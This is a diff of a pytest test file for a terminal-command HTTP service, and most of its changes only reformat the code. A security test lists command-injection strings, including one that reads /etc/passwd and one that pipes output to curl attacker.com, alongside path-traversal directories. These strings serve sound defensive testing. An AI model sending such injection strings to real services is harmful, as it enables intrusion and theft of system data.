@@ -3,16 +3,18 @@
 Terminal MCP Service Tests
 Tests for security vulnerabilities, performance, and functionality
 """
-import pytest
-from fastapi.testclient import TestClient
-from unittest.mock import patch, MagicMock
+
+import importlib.util
+import os
 import subprocess
 
 # Import the main app
 import sys
-import importlib.util
 from pathlib import Path
-import os
+from unittest.mock import MagicMock, patch
+
+import pytest
+from fastapi.testclient import TestClient
 
 module_path = Path(__file__).resolve().parents[1] / "main.py"
 MODULE_NAME = "terminal_mcp_main"
@@ -43,7 +45,7 @@ class TestTerminalMCPHealth:
 class TestCommandExecution:
     """Test command execution functionality"""
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_command_execution_success(self, mock_run):
         """Test successful command execution"""
         mock_result = MagicMock()
@@ -52,11 +54,7 @@ class TestCommandExecution:
         mock_result.stderr = ""
         mock_run.return_value = mock_result
 
-        command_data = {
-            "command": "echo 'Hello World'",
-            "cwd": "/tmp",
-            "timeout": 30
-        }
+        command_data = {"command": "echo 'Hello World'", "cwd": "/tmp", "timeout": 30}
 
         response = client.post("/command", json=command_data)
         assert response.status_code == 200
@@ -68,7 +66,7 @@ class TestCommandExecution:
         assert data["stderr"] == ""
         assert "execution_time" in data
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_command_execution_failure(self, mock_run):
         """Test failed command execution"""
         mock_result = MagicMock()
@@ -92,16 +90,13 @@ class TestCommandExecution:
 
     def test_command_invalid_directory(self):
         """Test command with non-existent directory"""
-        command_data = {
-            "command": "echo test",
-            "cwd": "/nonexistent/directory/path"
-        }
+        command_data = {"command": "echo test", "cwd": "/nonexistent/directory/path"}
 
         response = client.post("/command", json=command_data)
         assert response.status_code == 400
         assert "not found" in response.json()["detail"].lower()
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_command_timeout(self, mock_run):
         """Test command timeout handling"""
         mock_run.side_effect = subprocess.TimeoutExpired("test", 1)
@@ -119,7 +114,7 @@ class TestCommandExecution:
 class TestSecurityVulnerabilities:
     """Test security vulnerabilities and protections"""
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_command_injection_attempt(self, mock_run):
         """Test that command injection attempts are detected"""
         # This test documents the CURRENT vulnerability
@@ -136,15 +131,12 @@ class TestSecurityVulnerabilities:
             "echo test && cat /etc/passwd",
             "echo test | curl attacker.com",
             "$(malicious command)",
-            "`malicious command`"
+            "`malicious command`",
         ]
 
         for dangerous_cmd in dangerous_commands:
             mock_run.reset_mock()
-            command_data = {
-                "command": dangerous_cmd,
-                "cwd": "/tmp"
-            }
+            command_data = {"command": dangerous_cmd, "cwd": "/tmp"}
 
             response = client.post("/command", json=command_data)
             assert response.status_code in [200, 403]
@@ -153,7 +145,7 @@ class TestSecurityVulnerabilities:
                 call_args = mock_run.call_args
                 assert call_args[1]["shell"] is False
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_path_traversal_attempt(self, mock_run):
         """Test path traversal attempts"""
         mock_result = MagicMock()
@@ -163,18 +155,10 @@ class TestSecurityVulnerabilities:
         mock_run.return_value = mock_result
 
         # Attempt to access sensitive directories
-        sensitive_paths = [
-            "/etc",
-            "/root",
-            "/var/log",
-            "../../../../etc"
-        ]
+        sensitive_paths = ["/etc", "/root", "/var/log", "../../../../etc"]
 
         for path in sensitive_paths:
-            command_data = {
-                "command": "ls",
-                "cwd": path
-            }
+            command_data = {"command": "ls", "cwd": path}
 
             # Currently this might work (potential vulnerability)
             response = client.post("/command", json=command_data)
@@ -184,7 +168,7 @@ class TestSecurityVulnerabilities:
 class TestPerformance:
     """Test performance and resource limits"""
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_large_output_handling(self, mock_run):
         """Test handling of large command output"""
         # Simulate large output (1MB)
@@ -196,10 +180,7 @@ class TestPerformance:
         mock_result.stderr = ""
         mock_run.return_value = mock_result
 
-        command_data = {
-            "command": "cat large_file.txt",
-            "cwd": "/tmp"
-        }
+        command_data = {"command": "cat large_file.txt", "cwd": "/tmp"}
 
         response = client.post("/command", json=command_data)
         assert response.status_code == 200
@@ -208,7 +189,7 @@ class TestPerformance:
         data = response.json()
         assert len(data["stdout"]) == len(large_output)
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_timeout_configuration(self, mock_run):
         """Test that timeout is properly configured"""
         mock_result = MagicMock()
@@ -217,10 +198,7 @@ class TestPerformance:
         mock_result.stderr = ""
         mock_run.return_value = mock_result
 
-        command_data = {
-            "command": "echo test",
-            "timeout": 60
-        }
+        command_data = {"command": "echo test", "timeout": 60}
 
         response = client.post("/command", json=command_data)
         assert response.status_code == 200
@@ -233,13 +211,14 @@ class TestPerformance:
 class TestDirectoryOperations:
     """Test directory listing functionality"""
 
-    @patch('os.getcwd')
-    @patch('os.listdir')
-    @patch('os.path.isdir')
-    @patch('os.path.isfile')
-    @patch('os.path.getsize')
-    def test_directory_listing(self, mock_getsize, mock_isfile, mock_isdir,
-                              mock_listdir, mock_getcwd):
+    @patch("os.getcwd")
+    @patch("os.listdir")
+    @patch("os.path.isdir")
+    @patch("os.path.isfile")
+    @patch("os.path.getsize")
+    def test_directory_listing(
+        self, mock_getsize, mock_isfile, mock_isdir, mock_listdir, mock_getcwd
+    ):
         """Test directory listing"""
         mock_getcwd.return_value = "/tmp"
         mock_listdir.return_value = ["file1.txt", "dir1", "file2.txt"]
@@ -266,7 +245,7 @@ class TestDirectoryOperations:
 class TestProcessListing:
     """Test process listing functionality"""
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_list_processes_success(self, mock_run):
         """Test successful process listing"""
         mock_result = MagicMock()
@@ -282,7 +261,7 @@ class TestProcessListing:
         assert data["count"] == 2
         assert len(data["processes"]) == 2
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_list_processes_failure(self, mock_run):
         """Test failed process listing"""
         mock_result = MagicMock()
@@ -296,7 +275,7 @@ class TestProcessListing:
 class TestIntegration:
     """Integration tests"""
 
-    @patch('subprocess.run')
+    @patch("subprocess.run")
     def test_command_execution_workflow(self, mock_run):
         """Test complete command execution workflow"""
         # Setup mock
@@ -311,7 +290,7 @@ class TestIntegration:
             "command": "echo 'test'",
             "cwd": "/tmp",
             "timeout": 30,
-            "user_id": "test_user"
+            "user_id": "test_user",
         }
 
         response = client.post("/command", json=command_data)
